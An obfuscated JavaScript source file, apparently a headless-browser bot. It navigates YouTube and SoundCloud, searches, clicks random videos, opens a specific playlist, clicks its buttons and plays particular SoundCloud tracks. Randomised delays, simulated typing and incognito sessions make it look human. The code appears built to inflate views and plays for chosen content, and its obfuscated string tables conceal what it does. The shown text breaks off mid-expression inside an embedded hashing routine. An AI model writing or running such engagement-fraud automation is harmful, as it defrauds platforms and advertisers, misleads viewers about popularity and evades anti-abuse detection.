const Y = c,
  X = b,
  W = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xff8 * 0x1 + -0x13ee + 0xd * 0x2c3))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x67f + 0x258b + -0x1f0c), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function a() {
  const bl = [
    'y2fWDgnOys1ZBW',
    'strict-ori',
    'BwuVmta4lJaUma',
    'ww3dU8kdWO45WRzUaLi',
    'mpt...',
    'RQdxHi4_Pv',
    'Ahr0Chm6lY9ZBW',
    'w6gccNWXXv',
    'zw51C2vYANmUBW',
    'sByClassNa',
    'y2yGamoJW5HQf8oJsq',
    'ChrZlZq1ntG1mW',
    'ZDTESiN1eS',
    'rg/en/scri',
    'close',
    'y2XPy2S',
    'uhjVBwLZzq'
  ];
  a = function() {
    return bl;
  };
  return a();
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x2 * -0x4492 + -0x2652 + -0x125e * -0x1 + (0xb * -0x411 + -0x275 * 0x25 + 0x191 * 0x7c) * random()) : await standardWaitForNetIdle(f), await wait(-0xa44 + 0x6 * 0x253 + 0xfda + (0x36a2 + 0x455e * -0x1 + 0x2 * 0x1ae6) * random()), 0x1dd * -0x3 + -0x1b9e + 0x6 * 0x589;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x40 * 0x98 + 0x761 * 0x2 + -0x213a), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1 * 0x19c7 + 0x1f08 + -0x295 * 0x16;
}
async function randomWait() {
  return await wait(0x104c + 0x137 * 0x8 + -0x67c + (0xd12 + 0x1b2f * 0x1 + -0x14b9) * random()), -0x3 * -0x605 + 0x835 + -0x1a43;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * -0x1873 + -0x1bb5 * 0x1 + 0xd0a * 0x4, 0x786 + -0x1f9b + 0x181c), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x5 * -0x5997 + -0x16d12 * -0x1 + -0x242a5) * getRandomInt(0x1 * 0x2605 + 0x31 * 0x29 + -0x1 * 0x2ddc, -0x61 * 0x47 + 0x13b * -0x1b + 0x3c25), h)), 0x17ae + -0x2376 + 0xbc9;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0xaa * -0x32 + 0x402 + 0xe99 * 0x2;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1 * -0x1f94 + 0x617 + 0x2 * -0x12d5]['split']('\x20');
    for (let k = -0x1 * -0xadf + 0x2009 + -0x2ae8; k < i['length']; k += 0x1d5 * -0x15 + 0x1608 + 0x1073 * 0x1)
      j += i[k] * h[i[k + (0x18e3 + 0x1999 + -0x327b)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1 * 0x1dcb + -0x10ae + -0xd17)['map'](l => Array['from'](l['children']))['flat'](0xd86 * -0x2 + -0x303 * -0xb + -0x4 * 0x185)['map'](l => l['childNodes'][-0x1 * 0xd55 + 0x31 * 0x55 + 0x1 * -0x2ef]['childNodes'][0x1 * -0x21ec + 0x1ca9 + -0x1 * -0x543]['childNodes'][0x1dde + 0xf * -0x1ed + -0xfa]['childNodes'][-0x1 * -0x2d1 + 0x11 * 0x1d2 + 0xb41 * -0x3]['childNodes'][0x19 * -0xd7 + 0x6b * 0x35 + -0x127]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x3ac * -0x1 + -0x1fea + 0x2026, -0x17d5 + -0x1d85 + -0x26 * -0x1eb)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0xb99 * -0x6 + 0x6f * -0xc7 + 0x3 * 0x1919);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1a747 * 0x1 + 0xe * 0x834 + 0x1 * 0x21ecf) * getRandomInt(-0x22ae + -0x155a * 0x1 + 0x957 * 0x6, -0x801 + -0xfa2 + 0x17a8), h);
  return await wait(i), -0x14ba + 0x2675 * 0x1 + -0x11ba;
}
async function frontScreenActions(f) {
  const R = d;
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + R(0x4)), await f['evaluate'](() => {
    const S = d;
    var h;
    (h = Array['from'](document['getElement' + S(0x9) + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1f * 0xa + 0x4 * -0x31c + -0x3be * -0x3]['children'][-0x1501 + 0x5 * -0x1c9 + 0x6 * 0x4fd]['children'][-0x1d0a + 0x1357 + 0x9b3]['children'][0x476 * -0x4 + -0x95b * 0x1 + 0x1 * 0x1b33]['children'][0x1ce9 * 0x1 + -0x9 * 0x1 + 0x1 * -0x1ce0]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1bd9 * -0x1 + -0x35 * 0x6d + -0x547;
}
async function searchAndView(f) {
  const T = c;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x7c * -0x35 + 0x1 * -0x24a0 + 0x3eb0 + (-0x46 * 0x11 + 0x1 * -0x2207 + 0x26df) * random()
  }), await wait(-0x1 * 0x445 + 0xaa * -0x17 + 0x157f + (-0x2074 + 0x129e + -0x781 * -0x2) * random()), await f[T(0xf)]('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x631 * 0x3 + 0x12 * 0x155 + -0x1 * 0x2a8b]['childNodes'][-0x1945 + 0x15b * 0xe + 0x64c]['childNodes'][-0x1 * -0x622 + -0x2699 + -0x40f * -0x8]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x25 * -0x4 + 0x4c3 + -0x42a]['childNodes'][-0x1b7f + 0x8e2 + 0x3b9 * 0x5]['childNodes'][0x2365 + 0x31 * -0x34 + 0x11 * -0x17f]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1b20 + -0x16b0 + 0x31d1),
          r = -0x1 * 0x5a7 + -0x2f * -0x9b + -0x16ce;
        for (let u = 0x1b62 + -0x1fc * -0x6 + -0x274a; u < q['length']; u += 0xee0 + 0x36 * 0x62 + -0x238a)
          r += q[u] * k[q[u + (0x2 * -0x1229 + -0x12b2 + 0x3705)]];
        return r;
      }(n);
  });
  await wait((0x577a * -0x1 + -0x8 * -0xe31 + 0x208a) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x12c2d + 0x79d * -0x9 + -0xb2b * -0x36) * getRandomInt(0x7bf * 0x5 + 0xd5e + -0x3418, -0x1f8d + 0x1 * 0x18aa + -0xc5 * -0x9), h + (0x1 * 0x124d + -0xc * -0x22d + -0x18e1));
  return await wait(i), 0x158b + 0x1 * 0x2007 + -0x11db * 0x3;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0xe3 * 0xf + 0x36 * 0x51 + -0x3c9), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1 * 0x170b + 0xb9d + 0x1726 + (0x12a8 * 0x2 + 0x668 + -0x27d0) * Math['random']());
    });
  }, 0x358d + 0x2f09 + -0x493e);
  await wait(0x423a1 + -0x8adce + 0x91e0d);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xc8b4 + -0x1 * 0x712d + 0x30f3 * 0x3) * getRandomInt(0x2d * 0x5d + 0x1ab5 + -0x2b0a, 0x1d7 * -0xd + -0x1 * 0xe2f + 0x7 * 0x575)), clearInterval(h), -0xdcc + -0x23aa + -0x107d * -0x3;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x12fb * 0x2 + -0xc7 * 0x5 + 0x29d9);
    let h = e[f];
    if (b['LzouAU'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1f4 * -0x2 + -0x21b7 + 0xd * 0x24b, s, t, u = 0x5f * -0x1f + 0x793 + 0x3ee; t = n['charAt'](u++); ~t && (s = r % (0x1a1f + 0x3 * -0xc95 + 0xba4) ? s * (0x258b + -0x788 + -0x1 * 0x1dc3) + t : t, r++ % (0xfca + -0x3dd * 0x1 + -0xbe9)) ? p += String['fromCharCode'](0x1e4e * -0x1 + 0x2482 + 0x2b * -0x1f & s >> (-(-0xa44 + 0x6 * 0x253 + -0x3ac) * r & 0x1b51 + 0x22af * -0x1 + 0x2 * 0x3b2)) : 0x1dd * -0x3 + -0x1b9e + 0x1 * 0x2135) {
          t = o['indexOf'](t);
        }
        for (let v = 0x40 * 0x98 + 0x761 * 0x2 + -0x34c2, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1 * 0x19c7 + 0x1f08 + -0xc7 * 0x49))['slice'](-(0x104c + 0x137 * 0x8 + -0x1a02));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xd12 + 0x1b2f * 0x1 + -0x2841,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x3 * -0x605 + 0x835 + -0x1a44; u < 0x1 * -0x1873 + -0x1bb5 * 0x1 + 0x144 * 0x2a; u++) {
          p[u] = u;
        }
        for (u = 0x786 + -0x1f9b + 0x1815; u < -0x1 * -0x2555 + -0x1e6d * -0x1 + -0x42c2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1 * 0x2605 + 0x31 * 0x29 + -0x1 * 0x2cde), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x61 * 0x47 + 0x13b * -0x1b + 0x3c20, q = 0x17ae + -0x2376 + 0xbc8;
        for (let v = 0xaa * -0x32 + 0x402 + 0xe99 * 0x2; v < n['length']; v++) {
          u = (u + (-0x1 * -0x1f94 + 0x617 + 0x2 * -0x12d5)) % (-0x1 * -0xadf + 0x2009 + -0x29e8), q = (q + p[u]) % (0x1d5 * -0x15 + 0x1608 + 0x37d * 0x5), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x18e3 + 0x1999 + -0x317c)]);
        }
        return t;
      };
      b['VQPWNv'] = m, c = arguments, b['LzouAU'] = !![];
    }
    const j = e[0x1 * 0x1dcb + -0x10ae + -0xd1d],
      k = f + j,
      l = c[k];
    return !l ? (b['iEivlX'] === undefined && (b['iEivlX'] = !![]), h = b['VQPWNv'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x12fb * 0x2 + -0xc7 * 0x5 + 0x29d9);
    let h = e[f];
    if (c['tsMAph'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1f4 * -0x2 + -0x21b7 + 0xd * 0x24b, r, s, t = 0x5f * -0x1f + 0x793 + 0x3ee; s = m['charAt'](t++); ~s && (r = q % (0x1a1f + 0x3 * -0xc95 + 0xba4) ? r * (0x258b + -0x788 + -0x1 * 0x1dc3) + s : s, q++ % (0xfca + -0x3dd * 0x1 + -0xbe9)) ? o += String['fromCharCode'](0x1e4e * -0x1 + 0x2482 + 0x2b * -0x1f & r >> (-(-0xa44 + 0x6 * 0x253 + -0x3ac) * q & 0x1b51 + 0x22af * -0x1 + 0x2 * 0x3b2)) : 0x1dd * -0x3 + -0x1b9e + 0x1 * 0x2135) {
          s = n['indexOf'](s);
        }
        for (let u = 0x40 * 0x98 + 0x761 * 0x2 + -0x34c2, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1 * 0x19c7 + 0x1f08 + -0xc7 * 0x49))['slice'](-(0x104c + 0x137 * 0x8 + -0x1a02));
        }
        return decodeURIComponent(p);
      };
      c['DQdMOk'] = i, b = arguments, c['tsMAph'] = !![];
    }
    const j = e[0xd12 + 0x1b2f * 0x1 + -0x2841],
      k = f + j,
      l = b[k];
    return !l ? (h = c['DQdMOk'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x7ad + -0x50c + 0x1 * 0xcb9;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x4 * 0x610 + -0x1781 + -0x2fc2 * -0x1;
    await randomWait();
  }
  return 0x1fe6 + -0x19e3 + -0x1 * 0x602;
}

function fetchRandomSC() {
  const U = c;
  return Math['random']() <= 0xd4d + -0x430 * -0x2 + -0x15ad + 0.5 ? U(0x6) + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xd7 * -0xb + 0x113e + -0x1a7b + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x8 * -0x356 + 0x133a + -0x2dea + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x2534 + -0x12ef * 0x1 + 0x3823 * 0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1 * -0x187f + -0xc * 0xd09 + -0x23 * -0xa31 + getRandomInt(0x2 * -0xa65 + 0x5 * -0x142a + 0xb434, -0x1 * -0x7cca + -0x67fe + 0x6064));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x15 * -0x67 + 0x27e * -0x7 + 0x19e6), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1 * -0xdf3 + 0x1bbf + -0xdcc;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x9d1 * -0x1 + 0x2 * 0xaec + -0x1fa9, 0xc5d * 0x3 + -0xb * 0x171 + -0x150a * 0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * -0x1e + 0xbf2 * 0x2 + -0x9 * 0x1c6 + floor((0x2466 + -0x18cd + -0x7b1) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x19b2aa14 + 0x864ee082 + 0x1e * 0xa575a7),
          0xc370bb + -0x57a1 * -0x251 + 0x37 * -0x4eab4,
          -0x40ec + 0xc235 * 0x1 + -0x149,
          0x9cd + -0xeb3 + 0x566 * 0x1
        ], y = [
          -0x2149 + -0x972 * -0x2 + -0x1 * -0xe7d,
          -0x1058 * 0x1 + 0x175e + -0x6f6,
          -0xd31 + 0x1c9a + -0xf61,
          0x50 * -0x7d + -0x13 * -0x13d + 0xf89
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xb72 + 0x13 * -0xa4 + -0xbb * -0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x3d1 * 0x6 + -0x21a1 * 0x1 + 0x1 * 0x3887; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x2d * 0x1b + -0x1c08 + 0x7c3 * 0x3) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x11d0 + -0x94a + -0x2 * -0xd8d] = A[-0xe06 + 0x16ed * -0x1 + -0x19 * -0x17b] = A[0x1 * 0x1f3d + 0xa1b + -0x2957] = A[-0x67 * 0x3d + -0x9cd * 0x1 + 0x225a] = A[0x1c95 + 0x2 * -0x75e + -0xfd * 0xe] = A[-0x1065 * -0x2 + 0x8e * 0x2b + -0x4b8 * 0xc] = A[-0x2 + 0x8c2 + -0x8bb] = A[0x2e0 + -0x1 * -0x7ce + -0x8 * 0x155] = A[-0x1978 + 0x1fae + 0x62f * -0x1] = A[0x107 + -0x1e7 + -0x4 * -0x3a] = A[-0x1efb + -0x1fae * -0x1 + -0xaa] = A[0x1b * 0xf0 + -0xb01 * 0x2 + -0x344] = A[0x1 * -0x1bec + 0x2504 + -0x14b * 0x7] = A[0xae0 + 0x9ad * 0x1 + 0xb5 * -0x1d] = A[0x47 * -0x15 + 0x26a + 0x376] = A[0x28 * 0x16 + -0x14a5 + 0x1eb * 0x9] = A[-0x512 + 0x6f6 * 0x3 + 0x25 * -0x6d] = 0x1256 + 0xd67 * 0x1 + 0x41 * -0x7d, this['blocks'] = A) : this['blocks'] = [
                0xb7 * 0x1d + -0x924 + -0x3dd * 0x3,
                0x422 * -0x1 + -0xdd8 * -0x1 + 0x2 * -0x4db,
                -0x1fa7 + -0x17 * 0xd0 + -0x731 * -0x7,
                0x239e + 0x2319 + -0x46b7,
                0xda9 * -0x1 + 0x866 + -0x1 * -0x543,
                0x2 * -0xf18 + 0x62 + 0x1dce,
                0x14 * -0xc2 + 0x1 * 0x706 + 0x6 * 0x15b,
                -0xc6e + 0x172d + -0x7 * 0x189,
                -0x23a7 * -0x1 + 0x3 * 0x905 + 0x3eb6 * -0x1,
                0xaf7 + -0x2145 + 0x164e,
                -0x1 * 0x952 + 0x1664 + -0xd12,
                -0x8a2 + -0x1bf7 * 0x1 + -0x1b * -0x15b,
                -0x12e5 + -0xfe3 + 0x22c8,
                0x156 * -0x2 + 0xb41 * 0x2 + -0x13d6,
                -0x217 * 0x12 + -0x2296 + 0x4834,
                0x23ef + 0x1b85 * -0x1 + -0x86a,
                0x24a8 + -0xfee * -0x2 + -0x6da * 0xa
              ], this['h0'] = -0x17 * -0x1485aee + 0x4d6496ab + 0x12 * -0x3388d6, this['h1'] = 0x2f28c58 + -0x4 * 0x346d913 + 0xf9f6837d, this['h2'] = 0x4a8 * -0x2230d6 + 0x30e421 * -0x5df + 0x25b1 * 0xfe43d, this['h3'] = 0xf167061 + -0x187d6a1f * -0x1 + -0x46ee * 0x5463, this['h4'] = -0x67778735 * 0x3 + 0x13663120 + 0x1e6d3466f, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x4 * 0x96b + 0x8fb + -0x41 * -0x71, this['finalized'] = this['hashed'] = -0x1 * 0x1a69 + 0x1b18 + -0x5 * 0x23, this['first'] = -0x8c * 0x38 + 0xb56 + 0x134b;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x23a2 + 0x5b * 0x5c + -0x4456, O = J['length'] || 0x257b + 0x2001 + -0x22be * 0x2, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x841 * -0x2 + 0x2421 + -0x34a3, P[0x2 * 0xb82 + -0x2318 + 0xc14] = this['block'], P[0x1aa5 + -0x259d * -0x1 + -0x2019 * 0x2] = P[0x1e2b + 0x1333 + 0x315d * -0x1] = P[0x1 * 0xb6c + -0x2 * -0x2f5 + 0x1 * -0x1154] = P[0x341 + -0x461 * -0x2 + -0x100 * 0xc] = P[-0x26f4 + 0x230b + 0x43 * 0xf] = P[-0x4 * -0x7bf + -0xffe + 0x1 * -0xef9] = P[-0x92b * -0x2 + -0x1e97 + 0xc47] = P[0x34c + 0xd41 + -0x9 * 0x1d6] = P[-0x469 + -0xfd * 0xc + 0x104d * 0x1] = P[0x1087 * -0x2 + -0x1e89 + 0x3fa0] = P[-0xd7 + 0x12ed + 0x42 * -0x46] = P[0xbab * -0x1 + 0x5f9 + 0xd * 0x71] = P[-0x2474 + 0x1923 + 0x1 * 0xb5d] = P[0x11 * -0x76 + 0x22b2 + -0x1acf] = P[-0x1c83 + -0x8 * -0xa4 + -0x1 * -0x1771] = P[0xee + 0x1 * -0x213e + -0x205f * -0x1] = 0x1 * 0x481 + -0xd8c + 0x90b), K) {
                    for (N = this['start']; M < O && N < 0x111a + -0x10 * -0x21a + 0x1a * -0x1f1; ++M)
                      P[N >> -0x1115 * -0x1 + 0xca * 0x2d + -0x1 * 0x3495] |= J[M] << y[0x2569 + 0x611 * -0x2 + -0x1944 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0xf * 0x233 + -0x14af + -0xc0e; ++M)
                      (L = J['charCodeAt'](M)) < 0xe63 + -0x558 + 0x9 * -0xf3 ? P[N >> -0x1c67 + 0x19d3 * 0x1 + 0x1 * 0x296] |= L << y[-0x42a + 0x2480 * -0x1 + 0x10b * 0x27 & N++] : L < 0x1 * 0xd54 + -0x1 * -0x1769 + 0x41b * -0x7 ? (P[N >> 0x3d7 + -0x179 * 0x1 + 0x25c * -0x1] |= (-0x6be * -0x2 + 0x1 * 0x1933 + -0x25ef | L >> 0x23c6 + 0x1f84 + -0x14 * 0x35d) << y[0x270 * 0x8 + 0x3 * 0x4fd + -0x2274 & N++], P[N >> -0x245c + 0x2 * -0xf25 + 0x42a8] |= (0x601 * 0x5 + 0x4 * 0x2ec + -0x2935 | -0xfaf * 0x1 + -0x1 * 0xab + -0x1 * -0x1099 & L) << y[0xc * -0xc + -0x2185 * 0x1 + 0x2218 & N++]) : L < -0xceb6 + -0x32cd + 0x1d983 || L >= -0x8e * 0x247 + 0x61 * 0x1d7 + 0x170eb ? (P[N >> 0x163 + -0xbc + -0x3 * 0x37] |= (-0x1bec + -0x8de * 0x2 + 0x2e88 | L >> -0x1 * 0x1523 + -0xbc3 + 0x1 * 0x20f2) << y[0x14bd * -0x1 + -0x4 * 0x541 + -0x24 * -0x129 & N++], P[N >> -0x4e7 * 0x5 + 0x11f5 * -0x2 + 0x3c6f * 0x1] |= (0x23c6 * -0x1 + 0x2 * -0xb03 + 0xa4 * 0x5b | L >> -0xa2d * 0x1 + -0x2105 + 0x567 * 0x8 & 0xbe2 + 0x160f * -0x1 + 0x74 * 0x17) << y[-0xb86 + -0xc3 * -0x23 + 0xf2 * -0x10 & N++], P[N >> -0x145e + 0x1c5b + -0xe3 * 0x9] |= (-0x2250 + 0x101e * -0x1 + 0x32ee | -0x184a * -0x1 + 0x35 * -0x23 + -0xa * 0x1ae & L) << y[-0x1 * -0x13f1 + -0x3fb * 0x7 + -0x3 * -0x2a5 & N++]) : (L = 0xb6 + 0xde6b + 0x20df + ((-0x1f14 + -0x1 * 0x3d9 + 0x5e * 0x6a & L) << -0x3e7 + -0x1 * -0x1733 + 0x2 * -0x9a1 | -0x2430 + -0x747 + -0xa2 * -0x4b & J['charCodeAt'](++M)), P[N >> -0xc9 * 0x3 + -0x1b82 + 0x1ddf] |= (0x1ed7 + -0x18b3 + -0x534 | L >> -0x3 * -0x8df + -0x7bc + -0x12cf) << y[0x102a + -0x2 * 0x9e + -0x4f9 * 0x3 & N++], P[N >> 0x95b + 0x1 * -0x195b + 0x1002] |= (-0x1 * -0x1723 + -0x229 + -0x147a | L >> 0x2f2 * 